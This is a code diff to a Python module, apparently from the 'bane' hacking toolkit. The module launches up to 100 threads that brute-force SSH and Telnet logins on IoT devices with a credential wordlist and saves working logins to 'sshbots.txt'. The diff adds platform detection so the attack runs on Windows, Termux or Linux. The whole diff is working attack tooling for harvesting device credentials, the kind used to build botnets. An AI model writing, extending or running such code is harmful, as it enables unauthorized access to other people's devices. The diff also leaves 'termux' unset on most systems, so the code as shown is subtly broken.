@@ -1,14 +1,18 @@
 import os,sys,socket,random,time,threading,smtplib,telnetlib
+from bane.payloads import *
 from ftplib import FTP
-if (("linux" in sys.platform) and (os.path.isdir('/storage/emulated/0/')==True)):
- android=True
-if android==False:
+linux=True
+if os.path.isdir('/data/data/com.termux/')==True:
+ termux=True
+wido=False
+if (sys.platform == "win32") or( sys.platform == "win64"):
+ wido=True
+if termux==False:
  import paramiko
  from paramiko import SSHClient, AutoAddPolicy
  import pexpect
 import mysql.connector as mconn
 from bane.bruteforcer import *
-from bane.payloads import wordlist
 from bane.extrafun import create_file,write_file
 def getip():
  '''
@@ -54,22 +58,22 @@ class iots(threading.Thread):
      try:
       username=x.split(':')[0]
       password=x.split(':')[1]
-      if method==1:
-       q=ssh1(ip,username=username,password=password)
-      elif method==2:
-       q=ssh2(ip,username=username,password=password)
+      if wido==True:
+       q=sshwin(ip,username=username,password=password)
+      elif termux==True:
+       q=sshandro(ip,username=username,password=password)
+      else:
+       q=sshlin(ip,username=username,password=password)
       if q==True:
        ip+=':'+username+':'+password
        print (ip)
        write_file(ip,filen)
      except Exception as e: 
       pass
-def IoTssh(threads=100,meth=1,wl=wordlist,filename='sshbots.txt'):
+def IoTssh(threads=100,wl=wordlist,filename='sshbots.txt'):
  create_file(filename)
  global filen
  filen=filename
- global method
- method=meth
  global wordlist
  wordlist=wl
  for x in range(threads):
@@ -91,7 +95,7 @@ class iott(threading.Thread):
      try:
       username=x.split(':')[0]
       password=x.split(':')[1]
-      q= telnet2(ip,username=username,password=password)
+      q= telnet(ip,username=username,password=password)
       if q==True:
        ip+=':'+username+':'+password
        print (ip)
